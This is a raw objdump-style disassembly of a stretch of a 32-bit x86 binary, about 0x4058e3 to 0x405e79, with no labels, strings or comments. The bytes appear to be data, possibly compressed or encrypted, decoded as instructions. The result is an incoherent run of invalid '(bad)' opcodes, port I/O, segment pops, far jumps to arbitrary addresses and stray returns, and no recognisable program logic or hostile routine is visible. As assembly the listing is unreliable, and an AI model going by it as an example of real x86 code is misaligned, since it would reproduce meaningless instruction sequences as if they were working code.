  4058e3:	a9 6e dd 07 0f       	test   $0xf07dd6e,%eax
  4058e8:	3f                   	aas
  4058e9:	10 7a 1a             	adc    %bh,0x1a(%edx)
  4058ec:	4c                   	dec    %esp
  4058ed:	d9 2f                	fldcw  (%edi)
  4058ef:	09 5b 6d             	or     %ebx,0x6d(%ebx)
  4058f2:	3e 30 a4 ca 18 17 f5 	xor    %ah,%ds:0x1ef51718(%edx,%ecx,8)
  4058f9:	1e 
  4058fa:	65 51                	gs push %ecx
  4058fc:	54                   	push   %esp
  4058fd:	bd e9 33 36 e2       	mov    $0xe23633e9,%ebp
  405902:	c3                   	ret
  405903:	70 f0                	jo     0x4058f5
  405905:	27                   	daa
  405906:	27                   	daa
  405907:	e9 62 d1 2f 66       	jmp    0x66702a6e
  40590c:	76 8f                	jbe    0x40589d
  40590e:	a3 56 76 4c 93       	mov    %eax,0x934c7656
  405913:	26 79 f7             	es jns 0x40590d
  405916:	15 bf 07 84 a4       	adc    $0xa48407bf,%eax
  40591b:	40                   	inc    %eax
  40591c:	d3 c7                	rol    %cl,%edi
  40591e:	bd d4 ef 94 fe       	mov    $0xfe94efd4,%ebp
  405923:	66 80 c7 ae          	data16 add $0xae,%bh
  405927:	e6 5c                	out    %al,$0x5c
  405929:	e6 d8                	out    %al,$0xd8
  40592b:	86 58 6c             	xchg   %bl,0x6c(%eax)
  40592e:	87 63 32             	xchg   %esp,0x32(%ebx)
  405931:	e4 7d                	in     $0x7d,%al
  405933:	97                   	xchg   %eax,%edi
  405934:	20 06                	and    %al,(%esi)
  405936:	bb 95 d8 63 08       	mov    $0x863d895,%ebx
  40593b:	b6 cb                	mov    $0xcb,%dh
  40593d:	90                   	nop
  40593e:	2e 8f                	cs (bad)
  405940:	12 4e 98             	adc    -0x68(%esi),%cl
  405943:	5b                   	pop    %ebx
  405944:	c7 00 ea db e5 36    	movl   $0x36e5dbea,(%eax)
  40594a:	ad                   	lods   %ds:(%esi),%eax
  40594b:	86 cd                	xchg   %cl,%ch
  40594d:	2b 09                	sub    (%ecx),%ecx
  40594f:	fd                   	std
  405950:	bc ce aa c8 ce       	mov    $0xcec8aace,%esp
  405955:	bb 6b 16 fd 6b       	mov    $0x6bfd166b,%ebx
  40595a:	ff 12                	call   *(%edx)
  40595c:	37                   	aaa
  40595d:	90                   	nop
  40595e:	12 82 30 a8 a4 bf    	adc    -0x405b57d0(%edx),%al
  405964:	fd                   	std
  405965:	de 39                	fidivrs (%ecx)
  405967:	e7 09                	out    %eax,$0x9
  405969:	ad                   	lods   %ds:(%esi),%eax
  40596a:	86 1a                	xchg   %bl,(%edx)
  40596c:	a8 54                	test   $0x54,%al
  40596e:	7c de                	jl     0x40594e
  405970:	a9 f5 65 69 78       	test   $0x786965f5,%eax
  405975:	fb                   	sti
  405976:	f7 61 07             	mull   0x7(%ecx)
  405979:	00 cc                	add    %cl,%ah
  40597b:	34 da                	xor    $0xda,%al
  40597d:	96                   	xchg   %eax,%esi
  40597e:	29 da                	sub    %ebx,%edx
  405980:	bc 17 c3 66 18       	mov    $0x1866c317,%esp
  405985:	5f                   	pop    %edi
  405986:	5a                   	pop    %edx
  405987:	a3 8b ea 0b 6a       	mov    %eax,0x6a0bea8b
  40598c:	13 e6                	adc    %esi,%esp
  40598e:	5b                   	pop    %ebx
  40598f:	cb                   	lret
  405990:	8c ae 2d 80 60 7d    	mov    %gs,0x7d60802d(%esi)
  405996:	f1                   	int1
  405997:	4e                   	dec    %esi
  405998:	0a 3d 72 1b ee 1c    	or     0x1cee1b72,%bh
  40599e:	73 47                	jae    0x4059e7
  4059a0:	de 4c b2 d8          	fimuls -0x28(%edx,%esi,4)
  4059a4:	c0 96 31 81 4d 02 9f 	rclb   $0x9f,0x24d8131(%esi)
  4059ab:	0e                   	push   %cs
  4059ac:	77 4f                	ja     0x4059fd
  4059ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4059af:	4e                   	dec    %esi
  4059b0:	e7 98                	out    %eax,$0x98
  4059b2:	9a ee 39 4b 4e 48 a6 	lcall  $0xa648,$0x4e4b39ee
  4059b9:	2e 39 bf 83 e2 0a 47 	cmp    %edi,%cs:0x470ae283(%edi)
  4059c0:	0c 53                	or     $0x53,%al
  4059c2:	73 28                	jae    0x4059ec
  4059c4:	87 3c 06             	xchg   %edi,(%esi,%eax,1)
  4059c7:	b7 5a                	mov    $0x5a,%bh
  4059c9:	74 67                	je     0x405a32
  4059cb:	53                   	push   %ebx
  4059cc:	7d 9a                	jge    0x405968
  4059ce:	1f                   	pop    %ds
  4059cf:	07                   	pop    %es
  4059d0:	b7 af                	mov    $0xaf,%bh
  4059d2:	87 5e bc             	xchg   %ebx,-0x44(%esi)
  4059d5:	4b                   	dec    %ebx
  4059d6:	87 2b                	xchg   %ebp,(%ebx)
  4059d8:	67 91                	addr16 xchg %eax,%ecx
  4059da:	79 fc                	jns    0x4059d8
  4059dc:	b3 6c                	mov    $0x6c,%bl
  4059de:	d6                   	salc
  4059df:	4a                   	dec    %edx
  4059e0:	58                   	pop    %eax
  4059e1:	35 57 fb 38 24       	xor    $0x2438fb57,%eax
  4059e6:	2f                   	das
  4059e7:	24 32                	and    $0x32,%al
  4059e9:	33 72 5d             	xor    0x5d(%edx),%esi
  4059ec:	b0 bd                	mov    $0xbd,%al
  4059ee:	25 84 d6 08 dc       	and    $0xdc08d684,%eax
  4059f3:	a0 0f 83 9c 6a       	mov    0x6a9c830f,%al
  4059f8:	c4 20                	les    (%eax),%esp
  4059fa:	02 71 d4             	add    -0x2c(%ecx),%dh
  4059fd:	2c d1                	sub    $0xd1,%al
  4059ff:	fd                   	std
  405a00:	70 0b                	jo     0x405a0d
  405a02:	63 99 60 cf 98 1d    	arpl   %ebx,0x1d98cf60(%ecx)
  405a08:	7f bf                	jg     0x4059c9
  405a0a:	18 0b                	sbb    %cl,(%ebx)
  405a0c:	7d 83                	jge    0x405991
  405a0e:	d0 7e cb             	sarb   $1,-0x35(%esi)
  405a11:	5c                   	pop    %esp
  405a12:	47                   	inc    %edi
  405a13:	5a                   	pop    %edx
  405a14:	a3 f8 fc e3 03       	mov    %eax,0x3e3fcf8
  405a19:	0c 29                	or     $0x29,%al
  405a1b:	93                   	xchg   %eax,%ebx
  405a1c:	49                   	dec    %ecx
  405a1d:	0e                   	push   %cs
  405a1e:	16                   	push   %ss
  405a1f:	31 a5 26 a3 0e dd    	xor    %esp,-0x22f15cda(%ebp)
  405a25:	44                   	inc    %esp
  405a26:	40                   	inc    %eax
  405a27:	d9 7b be             	fnstcw -0x42(%ebx)
  405a2a:	e3 85                	jecxz  0x4059b1
  405a2c:	9c                   	pushf
  405a2d:	b1 85                	mov    $0x85,%cl
  405a2f:	8c 2f                	mov    %gs,(%edi)
  405a31:	ab                   	stos   %eax,%es:(%edi)
  405a32:	2d b6 33 73 35       	sub    $0x357333b6,%eax
  405a37:	12 e9                	adc    %cl,%ch
  405a39:	0b 71 17             	or     0x17(%ecx),%esi
  405a3c:	6d                   	insl   (%dx),%es:(%edi)
  405a3d:	5c                   	pop    %esp
  405a3e:	b1 41                	mov    $0x41,%cl
  405a40:	c6 46 66 d1          	movb   $0xd1,0x66(%esi)
  405a44:	45                   	inc    %ebp
  405a45:	56                   	push   %esi
  405a46:	6a 45                	push   $0x45
  405a48:	ef                   	out    %eax,(%dx)
  405a49:	82 c6 be             	add    $0xbe,%dh
  405a4c:	5a                   	pop    %edx
  405a4d:	9b                   	fwait
  405a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  405a4f:	c4 58 1f             	les    0x1f(%eax),%ebx
  405a52:	7b 33                	jnp    0x405a87
  405a54:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a55:	af                   	scas   %es:(%edi),%eax
  405a56:	8b fe                	mov    %esi,%edi
  405a58:	48                   	dec    %eax
  405a59:	d4 9b                	aam    $0x9b
  405a5b:	91                   	xchg   %eax,%ecx
  405a5c:	8e 87 f2 f8 30 5d    	mov    0x5d30f8f2(%edi),%es
  405a62:	b4 bf                	mov    $0xbf,%ah
  405a64:	84 5a b8             	test   %bl,-0x48(%edx)
  405a67:	ac                   	lods   %ds:(%esi),%al
  405a68:	65 3d 5a fe c7 24    	gs cmp $0x24c7fe5a,%eax
  405a6e:	da 14 2a             	ficoml (%edx,%ebp,1)
  405a71:	8d a9 40 6e 19 f0    	lea    -0xfe691c0(%ecx),%ebp
  405a77:	81 e8 93 16 05 4b    	sub    $0x4b051693,%eax
  405a7d:	9e                   	sahf
  405a7e:	ed                   	in     (%dx),%eax
  405a7f:	6d                   	insl   (%dx),%es:(%edi)
  405a80:	34 f4                	xor    $0xf4,%al
  405a82:	64 7c 92             	fs jl  0x405a17
  405a85:	60                   	pusha
  405a86:	4b                   	dec    %ebx
  405a87:	ce                   	into
  405a88:	cd e8                	int    $0xe8
  405a8a:	91                   	xchg   %eax,%ecx
  405a8b:	29 aa dc d1 8e 9c    	sub    %ebp,-0x63712e24(%edx)
  405a91:	c2 5f 6f             	ret    $0x6f5f
  405a94:	24 7d                	and    $0x7d,%al
  405a96:	43                   	inc    %ebx
  405a97:	06                   	push   %es
  405a98:	a9 56 7c a2 e9       	test   $0xe9a27c56,%eax
  405a9d:	cb                   	lret
  405a9e:	f2 80 4e 6a 75       	repnz orb $0x75,0x6a(%esi)
  405aa3:	a3 c8 9e 64 a6       	mov    %eax,0xa6649ec8
  405aa8:	da bf a3 ef 00 62    	fidivrl 0x6200efa3(%edi)
  405aae:	36 02 72 93          	add    %ss:-0x6d(%edx),%dh
  405ab2:	d1 4e c6             	rorl   $1,-0x3a(%esi)
  405ab5:	b9 8b ae 40 88       	mov    $0x8840ae8b,%ecx
  405aba:	ef                   	out    %eax,(%dx)
  405abb:	6d                   	insl   (%dx),%es:(%edi)
  405abc:	c8 01 89 07          	enter  $0x8901,$0x7
  405ac0:	6d                   	insl   (%dx),%es:(%edi)
  405ac1:	54                   	push   %esp
  405ac2:	79 81                	jns    0x405a45
  405ac4:	c9                   	leave
  405ac5:	55                   	push   %ebp
  405ac6:	ce                   	into
  405ac7:	35 c4 44 35 87       	xor    $0x873544c4,%eax
  405acc:	d7                   	xlat   %ds:(%ebx)
  405acd:	ca 0e 97             	lret   $0x970e
  405ad0:	31 5d a2             	xor    %ebx,-0x5e(%ebp)
  405ad3:	49                   	dec    %ecx
  405ad4:	19 7c c9 69          	sbb    %edi,0x69(%ecx,%ecx,8)
  405ad8:	bc e5 1f b7 97       	mov    $0x97b71fe5,%esp
  405add:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405ade:	12 92 f0 59 eb f9    	adc    -0x614a610(%edx),%dl
  405ae4:	bf 4a e4 83 36       	mov    $0x3683e44a,%edi
  405ae9:	d2 bd a8 34 19 e6    	sarb   %cl,-0x19e6cb58(%ebp)
  405aef:	ef                   	out    %eax,(%dx)
  405af0:	e7 61                	out    %eax,$0x61
  405af2:	ad                   	lods   %ds:(%esi),%eax
  405af3:	48                   	dec    %eax
  405af4:	5b                   	pop    %ebx
  405af5:	dd d6                	fst    %st(6)
  405af7:	eb 65                	jmp    0x405b5e
  405af9:	2d e7 26 ae 01       	sub    $0x1ae26e7,%eax
  405afe:	55                   	push   %ebp
  405aff:	7a 6e                	jp     0x405b6f
  405b01:	1f                   	pop    %ds
  405b02:	fc                   	cld
  405b03:	54                   	push   %esp
  405b04:	4c                   	dec    %esp
  405b05:	f9                   	stc
  405b06:	4a                   	dec    %edx
  405b07:	3a ee                	cmp    %dh,%ch
  405b09:	9f                   	lahf
  405b0a:	78 0e                	js     0x405b1a
  405b0c:	77 6c                	ja     0x405b7a
  405b0e:	17                   	pop    %ss
  405b0f:	e3 58                	jecxz  0x405b69
  405b11:	8f                   	(bad)
  405b12:	31 ab 81 7a 72 de    	xor    %ebp,-0x218d857f(%ebx)
  405b18:	fc                   	cld
  405b19:	80 58 26 62          	sbbb   $0x62,0x26(%eax)
  405b1d:	90                   	nop
  405b1e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b1f:	7c 09                	jl     0x405b2a
  405b21:	0c 07                	or     $0x7,%al
  405b23:	82 c3 c0             	add    $0xc0,%bl
  405b26:	5a                   	pop    %edx
  405b27:	d4 3f                	aam    $0x3f
  405b29:	d7                   	xlat   %ds:(%ebx)
  405b2a:	e9 4e fb a8 ca       	jmp    0xcae9567d
  405b2f:	32 7d b3             	xor    -0x4d(%ebp),%bh
  405b32:	20 89 d6 b2 9d 4d    	and    %cl,0x4d9db2d6(%ecx)
  405b38:	ea 3c 49 b7 61 92 da 	ljmp   $0xda92,$0x61b7493c
  405b3f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405b40:	9d                   	popf
  405b41:	9a d2 cd 9d b5 b8 58 	lcall  $0x58b8,$0xb59dcdd2
  405b48:	52                   	push   %edx
  405b49:	ba 69 fa 24 f2       	mov    $0xf224fa69,%edx
  405b4e:	b2 02                	mov    $0x2,%dl
  405b50:	c6                   	(bad)
  405b51:	13 91 eb 80 9a 7c    	adc    0x7c9a80eb(%ecx),%edx
  405b57:	5d                   	pop    %ebp
  405b58:	76 55                	jbe    0x405baf
  405b5a:	01 c0                	add    %eax,%eax
  405b5c:	43                   	inc    %ebx
  405b5d:	bb 1f f4 2f ae       	mov    $0xae2ff41f,%ebx
  405b62:	a2 cf 68 e9 1e       	mov    %al,0x1ee968cf
  405b67:	4c                   	dec    %esp
  405b68:	0d 9b 7c 25 25       	or     $0x25257c9b,%eax
  405b6d:	9c                   	pushf
  405b6e:	17                   	pop    %ss
  405b6f:	52                   	push   %edx
  405b70:	3d b3 d2 63 b8       	cmp    $0xb863d2b3,%eax
  405b75:	a2 a5 26 51 27       	mov    %al,0x275126a5
  405b7a:	d6                   	salc
  405b7b:	f6 3c 77             	idivb  (%edi,%esi,2)
  405b7e:	e1 30                	loope  0x405bb0
  405b80:	1e                   	push   %ds
  405b81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b82:	9d                   	popf
  405b83:	3b 38                	cmp    (%eax),%edi
  405b85:	17                   	pop    %ss
  405b86:	7d 2c                	jge    0x405bb4
  405b88:	34 d2                	xor    $0xd2,%al
  405b8a:	b6 b3                	mov    $0xb3,%dh
  405b8c:	8f                   	(bad)
  405b8d:	e4 1d                	in     $0x1d,%al
  405b8f:	d5 ee                	aad    $0xee
  405b91:	16                   	push   %ss
  405b92:	3a d6                	cmp    %dh,%dl
  405b94:	77 9b                	ja     0x405b31
  405b96:	1f                   	pop    %ds
  405b97:	95                   	xchg   %eax,%ebp
  405b98:	05 ca d8 5a d4       	add    $0xd45ad8ca,%eax
  405b9d:	b8 2f 11 f3 1a       	mov    $0x1af3112f,%eax
  405ba2:	43                   	inc    %ebx
  405ba3:	19 00                	sbb    %eax,(%eax)
  405ba5:	cf                   	iret
  405ba6:	f6 57 be             	notb   -0x42(%edi)
  405ba9:	42                   	inc    %edx
  405baa:	7e 2e                	jle    0x405bda
  405bac:	fa                   	cli
  405bad:	ae                   	scas   %es:(%edi),%al
  405bae:	a9 ea 17 88 49       	test   $0x498817ea,%eax
  405bb3:	bb 68 d1 1f 6e       	mov    $0x6e1fd168,%ebx
  405bb8:	4a                   	dec    %edx
  405bb9:	76 4c                	jbe    0x405c07
  405bbb:	30 71 17             	xor    %dh,0x17(%ecx)
  405bbe:	51                   	push   %ecx
  405bbf:	0f e2 fb             	psrad  %mm3,%mm7
  405bc2:	64 ae                	fs scas %es:(%edi),%al
  405bc4:	89 3d 7f f3 eb 6c    	mov    %edi,0x6cebf37f
  405bca:	07                   	pop    %es
  405bcb:	79 e4                	jns    0x405bb1
  405bcd:	d2 9b 72 7f ef 6f    	rcrb   %cl,0x6fef7f72(%ebx)
  405bd3:	a3 13 8b b8 1a       	mov    %eax,0x1ab88b13
  405bd8:	72 87                	jb     0x405b61
  405bda:	64 b0 64             	fs mov $0x64,%al
  405bdd:	14 6b                	adc    $0x6b,%al
  405bdf:	20 c1                	and    %al,%cl
  405be1:	2f                   	das
  405be2:	86 99 8a e5 02 7d    	xchg   %bl,0x7d02e58a(%ecx)
  405be8:	5a                   	pop    %edx
  405be9:	3f                   	aas
  405bea:	6c                   	insb   (%dx),%es:(%edi)
  405beb:	dd 15 8e 09 30 e0    	fstl   0xe030098e
  405bf1:	cf                   	iret
  405bf2:	f2 32 cf             	repnz xor %bh,%cl
  405bf5:	d3 c6                	rol    %cl,%esi
  405bf7:	71 59                	jno    0x405c52
  405bf9:	77 e0                	ja     0x405bdb
  405bfb:	35 25 a6 84 52       	xor    $0x5284a625,%eax
  405c00:	29 b4 06 d0 19 1f 57 	sub    %esi,0x571f19d0(%esi,%eax,1)
  405c07:	0f 8e 6d d9 b2 bc    	jle    0xbcf3357a
  405c0d:	c4                   	(bad)
  405c0e:	f9                   	stc
  405c0f:	96                   	xchg   %eax,%esi
  405c10:	a9 05 3e 22 ca       	test   $0xca223e05,%eax
  405c15:	6d                   	insl   (%dx),%es:(%edi)
  405c16:	fa                   	cli
  405c17:	32 ef                	xor    %bh,%ch
  405c19:	54                   	push   %esp
  405c1a:	a1 06 8a 1f 1b       	mov    0x1b1f8a06,%eax
  405c1f:	20 3a                	and    %bh,(%edx)
  405c21:	b7 fc                	mov    $0xfc,%bh
  405c23:	6c                   	insb   (%dx),%es:(%edi)
  405c24:	87 d5                	xchg   %edx,%ebp
  405c26:	0b fe                	or     %esi,%edi
  405c28:	39 07                	cmp    %eax,(%edi)
  405c2a:	1f                   	pop    %ds
  405c2b:	01 6d 86             	add    %ebp,-0x7a(%ebp)
  405c2e:	7c 82                	jl     0x405bb2
  405c30:	f8                   	clc
  405c31:	93                   	xchg   %eax,%ebx
  405c32:	6d                   	insl   (%dx),%es:(%edi)
  405c33:	ac                   	lods   %ds:(%esi),%al
  405c34:	ea 33 ab a3 4a af 78 	ljmp   $0x78af,$0x4aa3ab33
  405c3b:	18 5e 47             	sbb    %bl,0x47(%esi)
  405c3e:	c1 38 0a             	sarl   $0xa,(%eax)
  405c41:	0c c0                	or     $0xc0,%al
  405c43:	91                   	xchg   %eax,%ecx
  405c44:	a1 78 69 9e c4       	mov    0xc49e6978,%eax
  405c49:	71 07                	jno    0x405c52
  405c4b:	70 1e                	jo     0x405c6b
  405c4d:	9d                   	popf
  405c4e:	34 e0                	xor    $0xe0,%al
  405c50:	7b 85                	jnp    0x405bd7
  405c52:	0e                   	push   %cs
  405c53:	0b 3d c7 84 16 93    	or     0x931684c7,%edi
  405c59:	d0 7a 6d             	sarb   $1,0x6d(%edx)
  405c5c:	6d                   	insl   (%dx),%es:(%edi)
  405c5d:	4a                   	dec    %edx
  405c5e:	b9 5e 72 a8 98       	mov    $0x98a8725e,%ecx
  405c63:	fd                   	std
  405c64:	af                   	scas   %es:(%edi),%eax
  405c65:	0b 18                	or     (%eax),%ebx
  405c67:	d0 8d 7a af 7c 3c    	rorb   $1,0x3c7caf7a(%ebp)
  405c6d:	28 26                	sub    %ah,(%esi)
  405c6f:	40                   	inc    %eax
  405c70:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c71:	bd 8d 9c c2 a4       	mov    $0xa4c29c8d,%ebp
  405c76:	c3                   	ret
  405c77:	66 da 7a 42          	data16 fidivrl 0x42(%edx)
  405c7b:	92                   	xchg   %eax,%edx
  405c7c:	2f                   	das
  405c7d:	e6 af                	out    %al,$0xaf
  405c7f:	c2 93 9c             	ret    $0x9c93
  405c82:	35 22 82 c7 65       	xor    $0x65c78222,%eax
  405c87:	79 33                	jns    0x405cbc
  405c89:	61                   	popa
  405c8a:	b8 b1 da 31 90       	mov    $0x9031dab1,%eax
  405c8f:	52                   	push   %edx
  405c90:	ab                   	stos   %eax,%es:(%edi)
  405c91:	ae                   	scas   %es:(%edi),%al
  405c92:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c93:	c4 bc d2 fc 54 1f 1b 	les    0x1b1f54fc(%edx,%edx,8),%edi
  405c9a:	0e                   	push   %cs
  405c9b:	c5 2a                	lds    (%edx),%ebp
  405c9d:	e9 d7 91 53 7a       	jmp    0x7a93ee79
  405ca2:	f2 35 01 48 19 f8    	repnz xor $0xf8194801,%eax
  405ca8:	30 83 7b cf 97 1e    	xor    %al,0x1e97cf7b(%ebx)
  405cae:	46                   	inc    %esi
  405caf:	c6                   	(bad)
  405cb0:	11 8a 3c 06 2c 53    	adc    %ecx,0x532c063c(%edx)
  405cb6:	36 3e 08 88 fd 54 70 	ss or  %cl,%ds:0x487054fd(%eax)
  405cbd:	48 
  405cbe:	42                   	inc    %edx
  405cbf:	4c                   	dec    %esp
  405cc0:	0c 88                	or     $0x88,%al
  405cc2:	60                   	pusha
  405cc3:	80 1e b1             	sbbb   $0xb1,(%esi)
  405cc6:	df 68 a1             	fildll -0x5f(%eax)
  405cc9:	6c                   	insb   (%dx),%es:(%edi)
  405cca:	d7                   	xlat   %ds:(%ebx)
  405ccb:	07                   	pop    %es
  405ccc:	f2 cc                	repnz int3
  405cce:	79 5b                	jns    0x405d2b
  405cd0:	79 91                	jns    0x405c63
  405cd2:	80 f5 7d             	xor    $0x7d,%ch
  405cd5:	2f                   	das
  405cd6:	bd f0 cf 52 da       	mov    $0xda52cff0,%ebp
  405cdb:	08 ed                	or     %ch,%ch
  405cdd:	3a a7 89 18 7a 50    	cmp    0x507a1889(%edi),%ah
  405ce3:	11 a5 c2 e5 ef 26    	adc    %esp,0x26efe5c2(%ebp)
  405ce9:	dd 1d b5 db 7e b3    	fstpl  0xb37edbb5
  405cef:	11 d6                	adc    %edx,%esi
  405cf1:	6a a9                	push   $0xffffffa9
  405cf3:	17                   	pop    %ss
  405cf4:	aa                   	stos   %al,%es:(%edi)
  405cf5:	73 59                	jae    0x405d50
  405cf7:	57                   	push   %edi
  405cf8:	39 24 84             	cmp    %esp,(%esp,%eax,4)
  405cfb:	94                   	xchg   %eax,%esp
  405cfc:	fa                   	cli
  405cfd:	ce                   	into
  405cfe:	82 9a 8d 0e 7e 44 18 	sbbb   $0x18,0x447e0e8d(%edx)
  405d05:	10 3b                	adc    %bh,(%ebx)
  405d07:	6b 41 68 40          	imul   $0x40,0x68(%ecx),%eax
  405d0b:	89 d0                	mov    %edx,%eax
  405d0d:	70 fc                	jo     0x405d0b
  405d0f:	93                   	xchg   %eax,%ebx
  405d10:	1b fe                	sbb    %esi,%edi
  405d12:	2d 48 eb 52 29       	sub    $0x2952eb48,%eax
  405d17:	19 f2                	sbb    %esi,%edx
  405d19:	86 45 fd             	xchg   %al,-0x3(%ebp)
  405d1c:	46                   	inc    %esi
  405d1d:	e8 74 15 fc 4b       	call   0x4c3c7296
  405d22:	7c 32                	jl     0x405d56
  405d24:	83 63 43 08          	andl   $0x8,0x43(%ebx)
  405d28:	77 0d                	ja     0x405d37
  405d2a:	33 f0                	xor    %eax,%esi
  405d2c:	ae                   	scas   %es:(%edi),%al
  405d2d:	cd b4                	int    $0xb4
  405d2f:	19 c4                	sbb    %eax,%esp
  405d31:	ba eb 8c f8 be       	mov    $0xbef88ceb,%edx
  405d36:	a2 64 36 41 fb       	mov    %al,0xfb413664
  405d3b:	a3 95 5e 46 96       	mov    %eax,0x96465e95
  405d40:	39 c7                	cmp    %eax,%edi
  405d42:	40                   	inc    %eax
  405d43:	0f 3e                	(bad)
  405d45:	34 80                	xor    $0x80,%al
  405d47:	3a 9f 63 91 f3 e0    	cmp    -0x1f0c6e9d(%edi),%bl
  405d4d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405d4e:	be be cd 14 ba       	mov    $0xba14cdbe,%esi
  405d53:	2d 39 f7 66 94       	sub    $0x9466f739,%eax
  405d58:	9b                   	fwait
  405d59:	5d                   	pop    %ebp
  405d5a:	d0 60 ba             	shlb   $1,-0x46(%eax)
  405d5d:	14 15                	adc    $0x15,%al
  405d5f:	ce                   	into
  405d60:	5d                   	pop    %ebp
  405d61:	4d                   	dec    %ebp
  405d62:	67 b4 8c             	addr16 mov $0x8c,%ah
  405d65:	56                   	push   %esi
  405d66:	cd a1                	int    $0xa1
  405d68:	92                   	xchg   %eax,%edx
  405d69:	ef                   	out    %eax,(%dx)
  405d6a:	f6 36                	divb   (%esi)
  405d6c:	25 96 86 c5 a0       	and    $0xa0c58696,%eax
  405d71:	b0 7c                	mov    $0x7c,%al
  405d73:	8f                   	(bad)
  405d74:	9b                   	fwait
  405d75:	81 6b c8 12 7b 01 bc 	subl   $0xbc017b12,-0x38(%ebx)
  405d7c:	98                   	cwtl
  405d7d:	b9 24 cb ea b7       	mov    $0xb7eacb24,%ecx
  405d82:	42                   	inc    %edx
  405d83:	02 7d 52             	add    0x52(%ebp),%bh
  405d86:	98                   	cwtl
  405d87:	e3 c2                	jecxz  0x405d4b
  405d89:	ba b5 1c 4c 6f       	mov    $0x6f4c1cb5,%edx
  405d8e:	82 95 d3 f4 d2 f7 b5 	adcb   $0xb5,-0x82d0b2d(%ebp)
  405d95:	df 84 1d dc 89 53 32 	filds  0x325389dc(%ebp,%ebx,1)
  405d9c:	1b c6                	sbb    %esi,%eax
  405d9e:	ef                   	out    %eax,(%dx)
  405d9f:	54                   	push   %esp
  405da0:	d8 7d 3d             	fdivrs 0x3d(%ebp)
  405da3:	32 13                	xor    (%ebx),%dl
  405da5:	13 be 5c c7 80 26    	adc    0x2680c75c(%esi),%edi
  405dab:	e0 fe                	loopne 0x405dab
  405dad:	d9 c9                	fxch   %st(1)
  405daf:	ee                   	out    %al,(%dx)
  405db0:	88 94 77 bf 23 c9 5f 	mov    %dl,0x5fc923bf(%edi,%esi,2)
  405db7:	2c 93                	sub    $0x93,%al
  405db9:	d8 11                	fcoms  (%ecx)
  405dbb:	60                   	pusha
  405dbc:	0d fe d9 01 fe       	or     $0xfe01d9fe,%eax
  405dc1:	ad                   	lods   %ds:(%esi),%eax
  405dc2:	02 81 0a 4b 54 6f    	add    0x6f544b0a(%ecx),%al
  405dc8:	64 64 a8 fa          	fs fs test $0xfa,%al
  405dcc:	57                   	push   %edi
  405dcd:	5b                   	pop    %ebx
  405dce:	34 40                	xor    $0x40,%al
  405dd0:	69 fe c6 37 e8 c9    	imul   $0xc9e837c6,%esi,%edi
  405dd6:	1c 8e                	sbb    $0x8e,%al
  405dd8:	d4 e9                	aam    $0xe9
  405dda:	44                   	inc    %esp
  405ddb:	b9 25 0a 14 4a       	mov    $0x4a140a25,%ecx
  405de0:	70 7d                	jo     0x405e5f
  405de2:	cd 99                	int    $0x99
  405de4:	3c 10                	cmp    $0x10,%al
  405de6:	26 3e d9 c7          	es ds fld %st(7)
  405dea:	58                   	pop    %eax
  405deb:	36 4f                	ss dec %edi
  405ded:	b7 cb                	mov    $0xcb,%bh
  405def:	7f be                	jg     0x405daf
  405df1:	78 28                	js     0x405e1b
  405df3:	ad                   	lods   %ds:(%esi),%eax
  405df4:	7a 27                	jp     0x405e1d
  405df6:	99                   	cltd
  405df7:	0e                   	push   %cs
  405df8:	cc                   	int3
  405df9:	a2 61 88 b7 c6       	mov    %al,0xc6b78861
  405dfe:	58                   	pop    %eax
  405dff:	7e 81                	jle    0x405d82
  405e01:	d4 92                	aam    $0x92
  405e03:	29 96 d4 4f 3e ff    	sub    %edx,-0xc1b02c(%esi)
  405e09:	f8                   	clc
  405e0a:	78 1b                	js     0x405e27
  405e0c:	82 69 9a a7          	subb   $0xa7,-0x66(%ecx)
  405e10:	40                   	inc    %eax
  405e11:	38 1a                	cmp    %bl,(%edx)
  405e13:	09 f3                	or     %esi,%ebx
  405e15:	b3 8c                	mov    $0x8c,%bl
  405e17:	55                   	push   %ebp
  405e18:	51                   	push   %ecx
  405e19:	e3 b7                	jecxz  0x405dd2
  405e1b:	44                   	inc    %esp
  405e1c:	06                   	push   %es
  405e1d:	9e                   	sahf
  405e1e:	6f                   	outsl  %ds:(%esi),(%dx)
  405e1f:	58                   	pop    %eax
  405e20:	8e 16                	mov    (%esi),%ss
  405e22:	5b                   	pop    %ebx
  405e23:	9a 61 c4 e5 e6 43 fa 	lcall  $0xfa43,$0xe6e5c461
  405e2a:	4d                   	dec    %ebp
  405e2b:	5b                   	pop    %ebx
  405e2c:	50                   	push   %eax
  405e2d:	b9 cd 41 e1 ae       	mov    $0xaee141cd,%ecx
  405e32:	6a f5                	push   $0xfffffff5
  405e34:	3f                   	aas
  405e35:	4d                   	dec    %ebp
  405e36:	0a 8f d9 a6 04 63    	or     0x6304a6d9(%edi),%cl
  405e3c:	ef                   	out    %eax,(%dx)
  405e3d:	35 3b 83 63 4c       	xor    $0x4c63833b,%eax
  405e42:	aa                   	stos   %al,%es:(%edi)
  405e43:	de a0 98 66 8f d6    	fisubs -0x29709968(%eax)
  405e49:	4b                   	dec    %ebx
  405e4a:	e5 98                	in     $0x98,%eax
  405e4c:	39 ba c9 40 4f 5f    	cmp    %edi,0x5f4f40c9(%edx)
  405e52:	f5                   	cmc
  405e53:	28 63 19             	sub    %ah,0x19(%ebx)
  405e56:	65 71 72             	gs jno 0x405ecb
  405e59:	09 30                	or     %esi,(%eax)
  405e5b:	46                   	inc    %esi
  405e5c:	3c 88                	cmp    $0x88,%al
  405e5e:	79 d4                	jns    0x405e34
  405e60:	64 72 d9             	fs jb  0x405e3c
  405e63:	c8 95 45 7f          	enter  $0x4595,$0x7f
  405e67:	74 e3                	je     0x405e4c
  405e69:	36 c8 be b3 36       	ss enter $0xb3be,$0x36
  405e6e:	b4 d9                	mov    $0xd9,%ah
  405e70:	b0 1a                	mov    $0x1a,%al
  405e72:	01 d1                	add    %edx,%ecx
  405e74:	1f                   	pop    %ds
  405e75:	ca 52 9a             	lret   $0x9a52
  405e78:	98                   	cwtl
  405e79:	69 ba 8a 5c 73 e2 ab 	imul   $0x682f7aab,-0x1d8ca376(%edx),%edi
